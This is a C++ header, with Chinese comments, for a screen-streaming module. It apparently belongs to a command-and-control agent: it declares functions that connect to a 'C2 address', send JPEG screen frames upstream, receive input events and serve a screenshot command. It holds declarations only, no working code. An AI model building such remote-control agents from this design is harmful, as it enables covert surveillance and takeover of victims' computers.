// screen_stream.h — 屏幕流长连接（协议 §9）：帧上行 + 输入下行
#pragma once

#include <cstdint>
#include <string>
#include <vector>

namespace c2 {

struct AgentConfig;

// 设置屏幕流所需的连接配置（C2 地址 + agent 配置），main 启动时调用一次。
void screen_stream_set_config(const std::string& host, const AgentConfig& cfg);

// 启动/停止屏幕流（独立线程运行：握手 → 帧循环 + 收输入事件）。
// fps 帧率上限；quality JPEG 质量(1-100)。
bool start_screen_stream(int fps, int quality, float scale = 1.0f);
void stop_screen_stream();

// JPEG 编码（WIC）：BGRA 像素 → JPEG 字节流；成功返回 true。
// 供屏幕流帧编码与截屏指令（0x1001）共用。
bool jpeg_encode_bgra(int w, int h, int stride, const uint8_t* px, int quality,
                      std::vector<uint8_t>& out);

}  // namespace c2
